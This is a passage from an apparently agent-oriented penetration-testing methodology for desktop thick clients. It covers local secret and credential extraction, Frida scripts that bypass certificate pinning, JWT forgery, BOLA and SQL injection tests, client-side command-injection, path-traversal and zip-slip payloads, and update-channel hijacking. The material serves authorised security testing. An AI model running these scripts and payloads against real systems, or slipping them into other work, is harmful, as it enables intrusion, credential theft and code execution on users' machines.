# Cert validation / pinning logic
grep -rniE "ServerCertificateValidationCallback|X509Certificate|SslStream|checkServerTrusted|X509TrustManager|pinning|publicKeyHash|certificatePinner" dotnet_src java_src electron_src 2>/dev/null | tee cert_logic.txt
# Dangerous bypass patterns already in the code
grep -rniE "return true|TrustAll|AcceptAll|ALLOW_ALL|InsecureSkipVerify|NODE_TLS_REJECT_UNAUTHORIZED|rejectUnauthorized\\s*:\\s*false" dotnet_src java_src electron_src 2>/dev/null | tee cert_bypass.txt
# Weak crypto
grep -rniE "\\bDES\\b|RC4|MD5|ECB|new byte\\[16\\].*//.*IV|hardcoded.*key" dotnet_src java_src 2>/dev/null | tee weak_crypto.txt
```
- **Indicators:** Pinning routine present (=> Phase 4.2 needs Frida), or validation already disabled (no pinning, possibly already MITM-able); weak/static crypto.
- **Validation:** Confirm dynamically — static "looks pinned" must be proven by an actual handshake failure through Burp (Phase 4).
- **Evasion / edge cases:** Pinning may live in a native sub-library even for managed apps (Phase 4.2 Frida targets both managed and native).
- **Severity:** High for disabled validation (CWE-295); Medium for weak crypto (CWE-327).
- **Dispatch:** -> DesktopAppAgent ; weak crypto detail -> ReverseEngineeringAgent.

**Phase artifacts:** decompiled source trees (`dotnet_src/`, `java_src/`, `electron_src/`), `*_secrets.txt`/`*_deser.txt`/`*_cmd.txt`/`*_sql.txt`, `secrets_highconf.txt`, `connstrings.txt`, `cert_logic.txt`, `weak_crypto.txt`, carved resources, updated `/tmp/app-profile.json` with `binary_targets` and sink inventory.

**Gate-out:** Source recovered; sink inventory (deser/cmd/SQL/path) catalogued with reachable inputs; secrets validated live/dead; pinning posture known. Advance to Phase 3.

---

## PHASE 3: CONFIG, SECRET & LOCAL-STORAGE EXTRACTION

**Objective:** Audit every local store — config files, registry, local DBs, OS credential stores, logs — for secrets and insecure storage.

**Expert rationale:** Thick clients persist a lot locally and frequently trust the local box too much: plaintext creds, recoverable "encrypted" blobs (key in the binary), session tokens surviving logout. These are both findings in themselves and the fuel for server-side replay and lateral movement.

**Gate-in:** Phase 1 footprint map; app exercised through a real login so stores are populated.

### 3.1 Configuration File Audit

- **Objective / hypothesis:** Config files hold credentials, keys, endpoints, or feature flags in cleartext.
- **Procedure:**
```bash
cd "$OUT/storage"
APPDIR="$HOME/.config/App"   # or %APPDATA%\App, ~/Library/Application Support/App
find "$APPDIR" /etc 2>/dev/null \( -name "*.config" -o -name "*.json" -o -name "*.xml" -o -name "*.ya?ml" \
  -o -name "*.ini" -o -name "*.properties" -o -name "*.toml" -o -name "*.plist" \) -printf '%M %p\n' | tee config_inventory.txt
grep -rniE "password|secret|token|api[_-]?key|connectionstring|Server=|jdbc:" "$APPDIR" 2>/dev/null | tee config_secrets.txt
# macOS plist
plutil -p ~/Library/Preferences/com.vendor.app.plist 2>/dev/null | tee app_plist.txt
```
- **Indicators:** Cleartext secrets/connection strings; world-readable config (`-rw-rw-rw-` / `Users:(F)`).
- **Validation:** Use any recovered secret against the backend through Burp; confirm permissions with `ls -l`/`icacls`.
- **Evasion / edge cases:** "Encrypted" config may use DPAPI (3.4) or an embedded key (decode via Phase 11 hook on the decrypt routine).
- **Severity:** High (CWE-312) for plaintext secrets; chains to server-side.
- **Dispatch:** -> SecretsExposureAgent ; insecure ACLs -> Phase 8.1 / DesktopAppAgent.

### 3.2 Windows Registry Audit

- **Objective / hypothesis:** The app stores secrets/config in HKCU/HKLM, sometimes with weak key ACLs.
- **Procedure:**
```powershell
reg export "HKCU\Software\App" "$env:OUT\storage\hkcu_app.reg" /y
reg export "HKLM\Software\App" "$env:OUT\storage\hklm_app.reg" /y
reg query "HKCU\Software\App" /s | findstr /i "password secret token key connectionstring"
# Identify which key creds are read from (correlate with Procmon RegQueryValue during login)
```
- **Indicators:** Secrets in values; HKLM keys writable by `Users` (priv-esc/persistence pivot for Phase 8.2).
- **Validation:** `accesschk.exe -k -w "Users" HKLM\Software\App` to confirm weak ACL; replay any recovered secret.
- **Evasion / edge cases:** DPAPI-protected REG_BINARY blobs => 3.4.
- **Severity:** High for secrets (CWE-312); High if writable HKLM key drives behavior (CWE-269).
- **Dispatch:** -> SecretsExposureAgent ; writable keys -> Phase 8.2 / DesktopAppAgent.

### 3.3 Local Database Audit (SQLite / LevelDB / Realm)

- **Objective / hypothesis:** The client caches users, sessions, tokens or PII in a local DB.
- **Procedure:**
```bash
cd "$OUT/storage"
find "$HOME" -name "*.db" -o -name "*.sqlite*" -o -name "*.realm" 2>/dev/null | grep -i app | tee db_inventory.txt
DB="$HOME/.config/App/app.db"
sqlite3 "$DB" ".tables"; sqlite3 "$DB" ".schema" | tee db_schema.txt
for t in $(sqlite3 "$DB" "SELECT name FROM sqlite_master WHERE type='table';"); do
  echo "== $t =="; sqlite3 "$DB" "SELECT * FROM $t LIMIT 20;"; done | tee db_dump.txt
# Electron LevelDB (chrome storage): use a leveldb reader; cookies in Network/Cookies (often DPAPI/Keychain wrapped)
```
- **Indicators:** Plaintext tokens/sessions/PII; password hashes; cached API responses with other users' data.
- **Validation:** Replay a cached session token against the backend through Burp to prove it is live.
- **Evasion / edge cases:** Encrypted SQLite (SQLCipher) needs the key — hook the open call (Phase 11.3) to capture it.
- **Severity:** High (CWE-312/316) for live tokens/PII.
- **Dispatch:** -> SecretsExposureAgent ; cross-user cached data -> IDOR/BOLA in Phase 5.2 / APIAgent.

### 3.4 OS Credential Store Assessment (DPAPI / Keychain / keyring)

- **Objective / hypothesis:** "Securely stored" creds may be recoverable by the same user (DPAPI), or over-shared.
- **Procedure:**
```bash
# Windows
cmdkey /list
# DPAPI blobs in app dir — decrypt as the user (Impacket dpapi.py or mimikatz dpapi::blob)
# macOS
security find-generic-password -s "App" -g 2>&1 | tee "$OUT/storage/keychain.txt"
# Linux Secret Service
secret-tool search application App 2>/dev/null
```
- **Indicators:** Creds retrievable without re-auth; DPAPI blob decrypts with the logged-in user's key (no extra entropy).
- **Validation:** Decrypt/read as the standard user and confirm the value works against the backend.
- **Evasion / edge cases:** DPAPI with optional entropy needs the app's entropy constant (often hardcoded — recover in Phase 2/11); Keychain ACL may (correctly) prompt — note if it does NOT.
- **Severity:** Medium-High depending on whether retrieval needs no user interaction (CWE-522).
- **Dispatch:** -> SecretsExposureAgent.

### 3.5 Log File Audit

- **Objective / hypothesis:** Verbose/debug logging leaks tokens, requests, PII, or stack traces.
- **Procedure:**
```bash
cd "$OUT/storage"
find "$HOME" -iname "*.log" 2>/dev/null | grep -i app | tee log_inventory.txt
grep -rhniE "authorization|bearer|password|token|cookie|secret|api[_-]?key|set-cookie" $(cat log_inventory.txt) 2>/dev/null | tee log_leaks.txt
```
- **Indicators:** Authorization headers/tokens, request bodies with creds, PII in plaintext logs.
- **Validation:** Confirm logging persists in release/production build (not just debug); replay any logged token.
- **Evasion / edge cases:** Rotated/compressed logs (`.gz`) — decompress and scan; some apps log to syslog/Event Log.
- **Severity:** Medium-High (CWE-532).
- **Dispatch:** -> SecretsExposureAgent.

**Phase artifacts:** `config_inventory.txt`/`config_secrets.txt`, `*.reg` exports, `db_schema.txt`/`db_dump.txt`, `keychain.txt`, `log_leaks.txt`, validated-secret list (live vs dead) appended to `/tmp/bb-findings-secrets.json`.

**Gate-out:** All local stores enumerated; secrets validated; tokens/sessions captured for replay; insecure-ACL candidates handed to Phase 8. Advance to Phase 4.

---

## PHASE 4: TLS INTERCEPTION & BACKEND/API TRAFFIC

**Objective:** Force all client-backend traffic through Burp, defeat certificate pinning, and capture/enumerate every endpoint, protocol, and auth mechanism.

**Expert rationale:** This is the hinge of the whole engagement — once traffic is visible and pinning is dead, the thick client collapses into "just another API client" and the full server-side surface (Phase 5) opens. Pinning bypass via Frida is the senior move for clients that refuse the proxy or validate the chain.

**Gate-in:** Burp CA trusted per runtime (Pre-Flight); Frida installed (`piranha tools` confirms); authenticated session ready (auth-manager).

### 4.1 Proxy Configuration & Forced Routing

- **Objective / hypothesis:** The client either honors the system/env proxy, or must be forced to.
- **Procedure:**
```bash
# 1) Honor system/env proxy
export HTTP_PROXY="$BURP_PROXY" HTTPS_PROXY="$BURP_PROXY"
# Electron: also export NODE_EXTRA_CA_CERTS="$OUT/burp-ca.pem"; some apps need --proxy-server
# Java: java -Dhttps.proxyHost=127.0.0.1 -Dhttps.proxyPort=8080 -jar application.jar
# .NET: defaultProxy in app.config, or netsh winhttp set proxy 127.0.0.1:8080
# 2) Force apps that ignore proxy settings
#    Windows/macOS: Proxifier rule  application.exe -> 127.0.0.1:8080 (HTTPS)
#    Linux transparent redirect:
sudo iptables -t nat -A OUTPUT -p tcp --dport 443 -m owner ! --uid-owner root -j REDIRECT --to-port 8080
sudo iptables -t nat -A OUTPUT -p tcp --dport 80  -m owner ! --uid-owner root -j REDIRECT --to-port 8080
# Confirm capture
bun skills/BugBountyFramework/Tools/burp-bridge.ts --history --filter "status:200" | head
bun skills/BugBountyFramework/Tools/burp-bridge.ts --export-har --output "$OUT/traffic/baseline.har"
```
- **Indicators:** Requests appear in Burp proxy history; HAR export non-empty.
- **Validation:** `verifyTrafficCapture` via the bridge / `--history` returns >0 in-scope items after a flow.
- **Evasion / edge cases:** App uses raw TCP/non-HTTP => Phase 4.5; uses QUIC/HTTP3 => disable in client or fall back to Wireshark; respects only its own proxy config => set it in config/registry.
- **Severity:** Enabling (no finding by itself).
- **Dispatch:** -> APIAgent (consumes captured endpoints).

### 4.2 Certificate Pinning Bypass via Frida

- **Objective / hypothesis:** The client pins the server cert/public key; Frida removes the check at runtime so Burp's cert is accepted.
- **Procedure:**
```bash
cd "$OUT/traffic"
# Universal unpinning (covers OpenSSL, SChannel, .NET, Java, NSS, BoringSSL)
frida -l frida_unpin.js -f /path/to/application -o frida_unpin.log    # spawn
# or attach: frida -p $(pgrep -f application) -l frida_unpin.js -o frida_unpin.log
```
```javascript
// frida_unpin.js — multi-stack pinning kill (HTTP Toolkit style, condensed)
// .NET: force ServerCertificateValidationCallback to succeed
try {
  const m = Process.findModuleByName("System.Net.Security.dll") || Process.findModuleByName("System.dll");
} catch (e) {}
// Java: neutralise X509TrustManager.checkServerTrusted (via frida-java-bridge when JVM present)
if (Java && Java.available) {
  Java.perform(function () {
    var TM = Java.use('javax.net.ssl.X509TrustManager');
    var SSLCtx = Java.use('javax.net.ssl.SSLContext');
    // install an all-trusting TrustManager
    var TrustManager = Java.registerClass({ name: 'b.b', implements: [TM], methods: {
      checkClientTrusted: function () {}, checkServerTrusted: function () {}, getAcceptedIssuers: function () { return []; } } });
    var init = SSLCtx.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
    init.implementation = function (k, t, s) { init.call(this, k, [TrustManager.$new()], s); };
  });
}
// Native OpenSSL: make SSL_CTX_set_verify a no-op / SSL_get_verify_result return X509_V_OK (0)
['libssl.so', 'libssl-1_1.dll', 'libssl-3.dll'].forEach(function (lib) {
  var p = Module.findExportByName(lib, 'SSL_get_verify_result');
  if (p) Interceptor.replace(p, new NativeCallback(function () { return 0; }, 'long', ['pointer']));
});
```
- **Indicators:** After the hook, previously-failing HTTPS now flows through Burp; pinned host appears in proxy history.
- **Validation:** Disable the hook => handshake fails again (proves the pin existed and the bypass is what enabled capture).
- **Evasion / edge cases:** Custom in-app pinning (compares a hardcoded SPKI hash) — hook that specific compare function located in Phase 2.7; double-pin (OS + native lib) needs both branches; anti-Frida (see Phase 11.4) must be neutralized first.
- **Severity:** Enabling; the *absence* of pinning where it is required may itself be a Medium finding (CWE-295) depending on threat model.
- **Dispatch:** -> DesktopAppAgent (bypass) -> APIAgent (now-visible traffic).

### 4.3 Function Hooking for Pre-TLS / Post-Decrypt Capture

- **Objective / hypothesis:** Even without unpinning, hooking the send/encrypt boundary reveals plaintext requests and crypto material.
- **Procedure:**
```bash
frida -p $(pgrep -f application) -l frida_capture.js -o "$OUT/traffic/frida_capture.log"
```
```javascript
// frida_capture.js — log plaintext before TLS and decrypted data
['SSL_write','SSL_read'].forEach(function (fn) {
  ['libssl.so','libssl-3.dll','libssl-1_1.dll'].forEach(function (lib) {
    var p = Module.findExportByName(lib, fn);
    if (p) Interceptor.attach(p, { onEnter: function (a) {
      try { console.log('['+fn+'] '+ a[1].readUtf8String(a[2].toInt32())); } catch (e) {} } });
  });
});
// Windows SChannel / Winsock fallback
var send = Module.findExportByName('ws2_32.dll','send');
if (send) Interceptor.attach(send, { onEnter: function (a) { try { console.log(hexdump(a[1], {length: a[2].toInt32()})); } catch(e){} } });
```
- **Indicators:** Plaintext request/response bodies and tokens in the hook log even for pinned/custom-protocol traffic.
- **Validation:** Correlate hooked bodies with Burp history (or use as the sole record for non-HTTP traffic).
- **Evasion / edge cases:** Statically-linked TLS => hook by address from Phase 2.1 rather than export name.
- **Severity:** Enabling.
- **Dispatch:** -> APIAgent ; crypto material -> SecretsExposureAgent.

### 4.4 Endpoint & Auth-Mechanism Enumeration

- **Objective / hypothesis:** The captured traffic reveals the full API contract and auth scheme.
- **Procedure:**
```bash
cd "$OUT/traffic"
bun skills/BugBountyFramework/Tools/burp-bridge.ts --sitemap > sitemap.json
bun skills/BugBountyFramework/Tools/burp-bridge.ts --history > history.json
# Extract endpoints + auth headers
jq -r '.[].url' history.json 2>/dev/null | sort -u | tee endpoints_live.txt
jq -r '.[].request.headers // empty' history.json 2>/dev/null | grep -iE "authorization|x-api-key|cookie" | sort -u | tee auth_headers.txt
```
- **Indicators:** REST/GraphQL/gRPC endpoints; JWT vs session vs API-key auth; sensitive params; admin/debug routes the GUI never exposes.
- **Validation:** Reconcile with `endpoints_static.txt` (Phase 1.5) — static-only endpoints are extra surface to probe.
- **Evasion / edge cases:** GraphQL => attempt introspection; versioned/hidden routes => fuzz from observed patterns (in scope only).
- **Severity:** Enabling; hidden privileged routes are High once authz-tested.
- **Dispatch:** -> APIAgent ; auth scheme -> AuthAgent.

### 4.5 Non-HTTP / Binary Protocol Analysis

- **Objective / hypothesis:** Some clients use gRPC/protobuf/WebSocket/custom-TCP not parsed as HTTP.
- **Procedure:**
```bash
cd "$OUT/traffic"
grpcurl -plaintext target:50051 list 2>/dev/null; grpcurl -plaintext target:50051 describe 2>/dev/null
protoc --decode_raw < captured_message.bin 2>/dev/null | tee proto_decoded.txt
tshark -i any -f "host api.target.com" -T json > capture.json 2>/dev/null     # raw capture for analysis
xxd captured_traffic.bin | head -50
```
- **Indicators:** gRPC reflection works; protobuf fields decode; WebSocket frames carry auth/commands.
- **Validation:** Replay/modify a decoded message and observe a backend state change.
- **Evasion / edge cases:** Custom framing needs a Wireshark dissector or a Frida hook at the serializer (Phase 4.3); mTLS needs the client cert (often extractable from the keystore in Phase 3).
- **Severity:** Enabling; protocol-level authz gaps are High.
- **Dispatch:** -> APIAgent.

**Phase artifacts:** `baseline.har`, `frida_unpin.js`/`frida_unpin.log`, `frida_capture.log`, `sitemap.json`/`history.json`, `endpoints_live.txt`, `auth_headers.txt`, `proto_decoded.txt`, AppProfile updated with the live API contract and auth scheme.

**Gate-out:** 100% of in-scope backend traffic visible in Burp (pinning defeated where present); endpoints + auth mechanism enumerated. Advance to Phase 5.

---

## PHASE 5: SERVER-SIDE / BACKEND TESTING (AUTH, INJECTION, BOLA)

**Objective:** Treat the now-visible backend as a full API target — test authentication, authorization (BOLA/BFLA), injection, and business logic with two identities.

**Expert rationale:** The single biggest thick-client miss is testing only the client. Backends behind fat clients are routinely under-hardened because the vendor assumed the client enforced the rules. Once unpinned and proxied, every OWASP API risk is in play — and BOLA is usually the crown jewel.

**Gate-in:** Phase 4 capture complete; low-priv and admin sessions in the vault/auth-manager; Burp scope enforced.

### 5.1 Authentication & Session Testing

- **Objective / hypothesis:** The auth scheme (JWT/session/API-key) is forgeable, replayable, or weakly validated.
- **Procedure:**
```bash
cd "$OUT/traffic"
# Replay a captured authed request with the low-priv session through Burp
LOW=$(bun skills/BugBountyFramework/Tools/credential-vault.ts --get --target thick-lowpriv 2>/dev/null)
curl -sk -x "$BURP_PROXY" -A "$UA" -H "Authorization: Bearer <low_jwt>" https://api.target.com/v1/me | tee auth_me.txt
# JWT abuse: alg=none, key confusion, weak HS256 secret
jwt_tool <token> -X a            # alg:none
jwt_tool <token> -C -d /usr/share/wordlists/jwt.txt   # crack HS256
# Token lifecycle: does logout invalidate server-side? replay after logout.
```
- **Indicators:** `alg:none`/forged token accepted; cracked HS256 secret; token valid after logout; missing expiry; weak/guessable API keys.
- **Validation:** A forged/replayed token returns authorized data via Burp; confirm twice to rule out caching.
- **Evasion / edge cases:** Refresh-token rotation, device-binding, signature over a subset of claims (forge the unsigned part), clock-skew tolerance.
- **Severity:** Critical for forgery/ATO (CWE-287/345).
- **Dispatch:** -> AuthAgent ; OAuth specifics -> (note for OAuthAgent if OAuth in use).

### 5.2 Authorization — BOLA / BFLA / Mass Assignment

- **Objective / hypothesis:** Object/function-level access control is enforced only client-side; the API lets the low-priv identity reach other users' objects or admin functions.
- **Procedure:**
```bash
cd "$OUT/traffic"
# BOLA: take an object-id from the low-priv account, request it as the same user but for another id
for id in 1001 1002 1003; do
  curl -sk -x "$BURP_PROXY" -A "$UA" -H "Authorization: Bearer <low_jwt>" \
    "https://api.target.com/v1/orders/$id" -o "bola_$id.json" -w "%{http_code} $id\n"; done | tee bola_matrix.txt
# BFLA: call admin-only endpoints (seen in 4.4) with the low-priv token
curl -sk -x "$BURP_PROXY" -A "$UA" -H "Authorization: Bearer <low_jwt>" -X POST \
  https://api.target.com/v1/admin/users -d '{"role":"admin"}' -w "%{http_code}\n" | tee bfla.txt
# Mass assignment: add privileged fields the client never sends
curl -sk -x "$BURP_PROXY" -A "$UA" -H "Authorization: Bearer <low_jwt>" -X PATCH \
  https://api.target.com/v1/me -d '{"role":"admin","is_verified":true}' | tee massassign.txt
```
- **Indicators:** 200 + another user's data (BOLA); admin action succeeds with low-priv token (BFLA); privileged field accepted (mass assignment).
- **Validation:** Diff the two-identity responses; confirm the cross-object data is genuinely another tenant's (not your own). The two-identity matrix is the proof.
- **Evasion / edge cases:** UUIDs => harvest other ids from list endpoints/responses; GUI-only client-side role checks are irrelevant once you craft the raw request; tenant headers (`X-Org-Id`) tampering.
- **Severity:** Critical for cross-tenant BOLA (CWE-639/285).
- **Dispatch:** -> APIAgent (BOLA/BFLA/mass-assignment).

### 5.3 Server-Side Injection (SQLi / NoSQLi / Command)

- **Objective / hypothesis:** API parameters reach a backend interpreter without parameterization.
- **Procedure:**
```bash
cd "$OUT/traffic"
# Drive sqlmap through the proxy using a captured authed request
sqlmap -r request.txt --proxy="$BURP_PROXY" --batch --random-agent --level 3 --risk 2 \
  --output-dir="$OUT/findings/sqlmap"
# Manual error/time-based + OOB via Collaborator
bun skills/BugBountyFramework/Tools/burp-bridge.ts --collaborator-poll &   # watch for OOB
curl -sk -x "$BURP_PROXY" -A "$UA" -H "Authorization: Bearer <low_jwt>" \
  "https://api.target.com/v1/search?q=test'||pg_sleep(5)--"
```
- **Indicators:** sqlmap confirms; consistent time delay on time-based payload; Collaborator DNS/HTTP hit for OOB.
- **Validation:** Reproduce the delay/extraction deterministically; OOB callback contains the injected token.
- **Evasion / edge cases:** WAF => `--tamper` chains, JSON/array param injection, second-order via stored fields; NoSQL => operator injection (`{"$gt":""}`).
- **Severity:** Critical for SQLi (CWE-89); High-Critical for cmd injection (CWE-78).
- **Dispatch:** -> SQLiAgent ; command sinks -> CommandInjectionAgent / RCEAgent.

### 5.4 Business Logic, Replay & Signature Abuse

- **Objective / hypothesis:** The client signs/HMACs requests or enforces sequencing the server doesn't re-check; or values (price/quantity/role) are trusted from the client.
- **Procedure:**
```bash
cd "$OUT/traffic"
# Recover the request-signing routine (Phase 2) and re-sign tampered requests
# Replay a captured purchase/transfer with modified amount; remove/forge the HMAC header
curl -sk -x "$BURP_PROXY" -A "$UA" -H "Authorization: Bearer <low_jwt>" -X POST \
  https://api.target.com/v1/transfer -d '{"to":"attacker","amount":-1000,"hmac":"<recomputed>"}'
```
- **Indicators:** Tampered/negative/zero values accepted; replayed request re-executes (no nonce); forged client HMAC accepted.
- **Validation:** Server state changes (balance/role) confirm the logic flaw, not just a 200.
- **Evasion / edge cases:** Nonce/timestamp windows, idempotency keys, server-side recompute of price.
- **Severity:** High-Critical depending on financial/authz impact (CWE-840/602).
- **Dispatch:** -> APIAgent ; auth-token-forgery aspects -> AuthAgent.

**Phase artifacts:** `bola_matrix.txt`, `bfla.txt`, `massassign.txt`, `sqlmap/`, JWT analysis, two-identity diff evidence, findings appended to `/tmp/bb-findings-api.json` and `/tmp/bb-findings-auth.json`.

**Gate-out:** Auth, authz (BOLA/BFLA), injection and key business flows tested with two identities; server-side findings captured with reproducible evidence. Advance to Phase 6.

---

## PHASE 6: CLIENT-SIDE INJECTION (LOCAL DB SQLi, RCE, COMMAND, PATH TRAVERSAL)

**Objective:** Attack the client's own input sinks — local SQL queries, eval/exec, OS command construction, and file path handling — reachable via UI, files, IPC, URI, or sync data.

**Expert rationale:** A thick client often builds local SQL, shells out, or writes files using attacker-influenceable input (synced server data, opened documents, clipboard, deep links). These yield code/command execution or arbitrary file access on the victim's box — local RCE that a web app can't reach.

**Gate-in:** Phase 2 sink inventory (deser/cmd/SQL/path) with reachable inputs identified.

### 6.1 Local Database Injection

- **Objective / hypothesis:** The client concatenates user/synced input into a local SQLite/embedded query.
- **Procedure:**
```bash
# From Phase 2: locate the query construction (e.g. "SELECT ... WHERE name='" + input + "'")
# Drive the input from the UI / synced field; observe via a Frida hook on sqlite3_prepare_v2
frida -p $(pgrep -f application) -l - <<'JS'
var p = Module.findExportByName(null, 'sqlite3_prepare_v2');
if (p) Interceptor.attach(p, { onEnter: function (a) { console.log('[SQL] ' + a[1].readUtf8String()); } });
JS
# Payloads: name = x' OR '1'='1   ;   x'; DROP TABLE audit;--   ;   x' UNION SELECT sql FROM sqlite_master--
```
- **Indicators:** Hooked query shows injected syntax unparameterized; UI returns rows it shouldn't / errors revealing injection.
- **Validation:** A UNION/boolean payload changes results deterministically; for SQLite, `load_extension`/`ATTACH` may escalate to file write.
- **Evasion / edge cases:** ORM with partial parameterization (raw fragments still injectable); SQLite `ATTACH DATABASE` to write arbitrary files (chain to 6.4/RCE).
- **Severity:** Medium-High locally; Critical if it reaches file write / extension load => RCE (CWE-89).
- **Dispatch:** -> SQLiAgent ; file-write escalation -> RCEAgent.

### 6.2 Client-Side RCE via Unsafe Sinks (eval / Function / template)

- **Objective / hypothesis:** The client evaluates attacker-influenceable strings (JS `eval`/`Function`, .NET `CSharpScript`, Java `ScriptEngine`, template engines).
- **Procedure:**
```bash
# From Phase 2 grep hits (eval/Function/ScriptEngine/CSharpScript):
# Feed the sink via the reachable input (synced field, opened file, IPC message, deep link)
# Electron renderer (if reachable) PoC payload:
#   require('child_process').exec('id > /tmp/pwn')           # nodeIntegration true
# Template injection probe in any client templating: {{7*7}} / ${7*7} / <%= 7*7 %>
```
- **Indicators:** Injected expression evaluates (49 / spawned process / file created).
- **Validation:** Replace the probe with a benign proof (write a marker file / OOB beacon via Burp Collaborator) — never destructive.
- **Evasion / edge cases:** contextIsolation/sandbox may block direct `require` => pivot through an exposed preload API (Phase 9.3); CSP in CEF.
- **Severity:** Critical (CWE-94/95).
- **Dispatch:** -> RCEAgent ; Electron path -> DesktopAppAgent.

### 6.3 OS Command Injection

- **Objective / hypothesis:** The client builds a shell command with attacker-influenceable input (file names, URLs, sync data, IPC args).
- **Procedure:**
```bash
# From Phase 2 (Process.Start / ProcessBuilder / system / shell.openExternal / child_process.exec):
# Inject shell metacharacters via the reachable input:
#   filename:  test.txt; touch /tmp/pwn         (or `; calc.exe` on Windows)
#   url arg:   https://x/$(id)  |  "&& whoami"
# Confirm OOB if no local effect is visible:
bun skills/BugBountyFramework/Tools/burp-bridge.ts --collaborator-poll &
#   payload: "; nslookup <collab-subdomain>"
```
- **Indicators:** Injected command runs (marker file / Collaborator DNS/HTTP hit).
- **Validation:** Deterministic repro; OOB callback carries the unique token.
- **Evasion / edge cases:** `exec` with arg array (no shell) blocks classic injection — look for `shell=true`/`cmd /c`/`/bin/sh -c`; argument injection (leading `--flag`) where shell metachars are filtered.
- **Severity:** High-Critical (CWE-78).
- **Dispatch:** -> CommandInjectionAgent ; chain -> RCEAgent.

### 6.4 Path Traversal / Arbitrary File Read-Write

- **Objective / hypothesis:** The client uses attacker-influenceable paths for read/write/extract (downloads, sync, plugin load, archive extraction).
- **Procedure:**
```bash
# Sinks from Phase 2: File.Open/ReadAllBytes, FileStream, Path.Combine(base, userInput), unzip/extract
# Payloads via the reachable input (filename/path field, archive entry, IPC arg, deep link):
#   ../../../../etc/passwd          (read)
#   ..\..\..\Windows\Temp\x.dll     (write -> chain DLL hijack Phase 8.3)
#   zip-slip: entry name ../../autostart/payload.desktop  (archive extraction)
```
- **Indicators:** File read outside the intended dir; file written to an attacker-chosen location; zip-slip lands a file outside the extract root.
- **Validation:** Read a known sentinel file outside scope-of-dir; or write a marker to a controlled path and confirm.
- **Evasion / edge cases:** Canonicalization differences (Windows 8.3 names, UNC paths, `file://`), null-byte/overlong UTF-8, symlink races (TOCTOU, chain Phase 8).
- **Severity:** High; Critical when write => RCE (autostart/DLL plant) (CWE-22).
- **Dispatch:** -> PathTraversalAgent ; write->exec -> RCEAgent.

**Phase artifacts:** Frida SQL hook logs, PoC marker files/Collaborator hits, traversal proofs, findings appended to `/tmp/bb-findings-rce.json` / `bb-findings-command-injection.json` / `bb-findings-path-traversal.json` / `bb-findings-sqli.json`.

**Gate-out:** Each Phase-2 client-side sink confirmed or killed with a benign PoC; escalation chains (write->exec) noted for ExploitChainAgent. Advance to Phase 7.

---

## PHASE 7: AUTO-UPDATE MECHANISM

**Objective:** Determine whether the update channel can be MITM'd, served unsigned/forged updates, downgraded, or abused for local code execution.

**Expert rationale:** The update path is the single highest-impact thick-client target: one broken update channel = remote code execution on the entire user base, often with installer-level privilege and built-in persistence. Seniors prioritize this even over local findings.

**Gate-in:** Phase 4 interception live; update endpoint identified (Phase 1.5/4.4); writable-dir map (Phase 1.4/8).

### 7.1 Update Channel Transport & Signature Review

- **Objective / hypothesis:** Updates are fetched over HTTP, or over HTTPS without package signature verification.
- **Procedure:**
```bash
cd "$OUT/update"
# Trigger an update check; capture the metadata + package fetch in Burp
bun skills/BugBountyFramework/Tools/burp-bridge.ts --history --filter "method:GET" | grep -iE "update|latest|appcast|releases|\.yml|\.json" | tee update_requests.txt
# Inspect manifest (Squirrel/electron-updater: latest.yml; Sparkle: appcast.xml)
curl -sk -x "$BURP_PROXY" -A "$UA" "https://update.target.com/latest.yml" | tee latest.yml
```
- **Indicators:** `http://` update URL; manifest lacks signature/hash; client code (Phase 2) never verifies a signature before executing the package.
- **Validation:** Cross-check the decompiled updater for the verify step; absence of `verifySignature`/`sha512` check confirms the gap.
- **Evasion / edge cases:** electron-updater verifies `sha512` from `latest.yml` but if `latest.yml` itself is served over MITM-able transport, both can be forged together; Sparkle EdDSA/DSA signature must be present and checked.
- **Severity:** Critical (CWE-494) if unsigned/HTTP.
- **Dispatch:** -> DesktopAppAgent.

### 7.2 Update Hijack (MITM / forged package)

- **Objective / hypothesis:** With interception, a forged update is accepted and executed.
- **Procedure:**
```bash
cd "$OUT/update"
# Use Burp match-and-replace (or a mitmproxy script) to swap the manifest + binary with a benign signed-marker payload.
# Benign proof payload: an "update" that writes $OUT/update/PWNED-<host>.txt instead of malware.
# Recompute any hash the client checks (sha512) so the forged package passes integrity but not signature.
openssl dgst -sha512 -binary forged_update.exe | openssl base64 -A   # to patch into forged latest.yml
```
- **Indicators:** Client downloads, "verifies", and runs the forged package; marker file created with updater privilege.
- **Validation:** Marker file appears, written by the updater process/service (check owner) — proves arbitrary code at update privilege.
- **Evasion / edge cases:** Code-signing enforced => this should fail (good); if it succeeds, signature checking is broken. Keep the payload strictly benign and reversible.
- **Severity:** Critical — fleet-wide RCE (CWE-494) with persistence.
- **Dispatch:** -> DesktopAppAgent -> ExploitChainAgent (weaponize into kill chain).

### 7.3 Downgrade / Rollback

- **Objective / hypothesis:** The client accepts an older, vulnerable version (no monotonic version check).
- **Procedure:**
```bash
cd "$OUT/update"
# Serve a manifest advertising an older known-vulnerable build; observe whether the client installs it.
sed 's/version: .*/version: 0.0.1/' latest.yml > downgrade.yml
# Replace via Burp and trigger update.
```
- **Indicators:** Client installs the older build (no rollback protection).
- **Validation:** Installed version == the advertised older version.
- **Evasion / edge cases:** Some clients block downgrade by version compare — note if absent.
- **Severity:** High (re-introduces patched vulns; CWE-494/757).
- **Dispatch:** -> DesktopAppAgent.

### 7.4 Update Staging Abuse (writable dir / TOCTOU / side-load)

- **Objective / hypothesis:** The updater stages files in a user-writable dir and a low-priv user can swap them before the privileged step runs (TOCTOU), or the updater side-loads a DLL from a writable path.
- **Procedure:**
```bash
# From Procmon: watch the updater stage to e.g. %TEMP%\App-Update or C:\ProgramData\App\update
icacls "C:\ProgramData\App\update" 2>/dev/null
# Race: replace the staged binary between download and elevated execute (loop swap), or
# plant a DLL the updater loads by search order (see Phase 8.3).
```
- **Indicators:** Staging dir writable by `Users`; swapped binary/DLL executes with elevated privilege.
- **Validation:** Marker payload runs as SYSTEM/admin (check token/owner).
- **Evasion / edge cases:** Tight TOCTOU window => oplocks/loop; signature re-check after stage closes the window.
- **Severity:** High-Critical local priv-esc (CWE-367/427).
- **Dispatch:** -> DesktopAppAgent -> ExploitChainAgent.

**Phase artifacts:** `update_requests.txt`, `latest.yml`/`downgrade.yml`, forged-package proof + marker file with owner, staging ACL output, findings to `/tmp/bb-findings-desktop.json`.

**Gate-out:** Transport, signature, downgrade and staging all tested; any update-hijack proven with a benign marker. Advance to Phase 8.

---

